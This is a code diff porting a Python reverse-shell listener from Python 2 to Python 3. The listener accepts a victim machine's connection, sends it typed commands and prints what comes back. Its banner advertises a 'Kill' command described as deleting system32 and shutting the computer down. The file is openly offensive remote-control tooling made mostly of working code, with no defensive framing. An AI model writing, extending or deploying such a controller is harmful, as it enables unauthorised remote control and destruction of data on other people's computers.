@@ -1,11 +1,6 @@
-#
-# Script VALIDATION: YES
-# python 27
-# TODO enter [chg] for change directory
-# TODO
-
 # 1 - Import the right module
 import socket
+
 import pyfiglet
 
 pyflig = pyfiglet.figlet_format("Revers Shell")
@@ -25,21 +20,20 @@ print("[!] Waiting Target Connexion")
 
 sock.listen(1)
 
-
 # 6 - Accept Connection
 connection, client_address = sock.accept()
 
 # 7 receive data from client_address
 data = connection.recv(3096)
-print ('Message from client: %s' % data, "[*]")
-print (" ")
-print ("|----------------------------------------------------------------------|")
-print ("| [!] Usage: basic Remote Shell [!]                                    |")
-print ("|- Tips: enter [root] to go directly to c:/                            |")
-print ("|- Tips: enter [chg] for change directory                              |")
-print (u"| \u2620 : enter Kill for delete system32 and shutdown computer       |")
-print ("|----------------------------------------------------------------------|")
-print (" ")
+print('Message from client: %s' % data, "[*]")
+print(" ")
+print("|----------------------------------------------------------------------|")
+print("| [!] Usage: basic Remote Shell [!]                                    |")
+print("|- Tips: enter [root] to go directly to c:/                            |")
+print("|- Tips: enter [chg] for change directory                              |")
+print(u"| \u2620 : enter Kill for delete system32 and shutdown computer       |")
+print("|----------------------------------------------------------------------|")
+print(" ")
 
 while True:
     # 8 - send confirmation
@@ -47,16 +41,15 @@ while True:
 
     # Go to C:\
     if cmd == "root":
-        connection.sendall("root")
+        connection.sendall(b"root")
 
     # Empty Message condition
     if len(cmd) == 0:
-        print ("[!] Empty Command Line")
+        print("[!] Empty Command Line")
         cmd = input("target@>")
 
-    connection.sendall(cmd)
+    connection.sendall(cmd.encode("utf-8"))
 
     #  9 - print cmd output
-    data = connection.recv(1024)
-    print (data)
-
+    data = connection.recv(1024).decode("utf-8")
+    print(data)
